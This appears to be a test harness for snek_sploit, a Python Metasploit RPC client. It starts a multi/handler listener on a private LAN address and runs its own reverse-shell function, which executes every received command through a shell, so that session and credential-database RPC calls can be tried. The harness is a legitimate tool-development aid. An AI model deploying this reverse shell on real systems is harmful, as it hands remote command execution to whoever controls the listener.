import time

from snek_sploit import Client
from snek_sploit.lib.rpc.module import ModuleType
import socket
import subprocess


def create_connection(target, port=4444):
    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    so.connect((target, port))
    while True:
        d = so.recv(1024)
        if len(d) == 0:
            break
        p = subprocess.Popen(d, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        o = p.stdout.read() + p.stderr.read()
        so.send(o)


if __name__ == '__main__':
    client = Client("msf", "root", disable_https_warnings=True)

    # Run in one terminal, then comment and test sessions freely
    execution = client.module.rpc.execute(ModuleType.exploit, "multi/handler", {"PAYLOAD": "python/shell_reverse_tcp", "LHOST": "192.168.0.222", "LPORT": 4444})
    time.sleep(2)
    create_connection("192.168.0.222")

    # Uncomment and test RPC here
    # client.session.rpc.list_sessions()

    # client.db.rpc.create_cracked_credential()
    # client.db.rpc.create_credential()
    # client.db.rpc.invalidate_login()
    # client.db.rpc.creds()
    # client.db.rpc.del_creds()
    # client.db.rpc.hosts()
    # client.db.rpc.services()
    # client.db.rpc.vulns()
    # client.db.rpc.workspaces()
    # client.db.rpc.current_workspace()
    # client.db.rpc.get_workspace()
    # client.db.rpc.set_workspace()
    # client.db.rpc.del_workspace()
    # client.db.rpc.add_workspace()
    # client.db.rpc.get_host()
    # client.db.rpc.analyze_host()
    # client.db.rpc.report_host()
    # client.db.rpc.report_service()
    # client.db.rpc.get_service()
    # client.db.rpc.get_note()
    # client.db.rpc.get_client()
    # client.db.rpc.report_client()
    # client.db.rpc.report_note()
    # client.db.rpc.notes()
    # client.db.rpc.get_ref()
    # client.db.rpc.del_vuln()
    # client.db.rpc.del_note()
    # client.db.rpc.del_service()
    # client.db.rpc.del_host()
    # client.db.rpc.report_vuln()
    # client.db.rpc.events()
    # client.db.rpc.report_event()
    # client.db.rpc.report_loot()
    # client.db.rpc.loots()
    # client.db.rpc.import_data()
    # client.db.rpc.get_vuln()
    # client.db.rpc.clients()
    # client.db.rpc.del_client()
    # client.db.rpc.driver()
    # client.db.rpc.connect()
    # client.db.rpc.disconnect()
    # client.db.rpc.status()
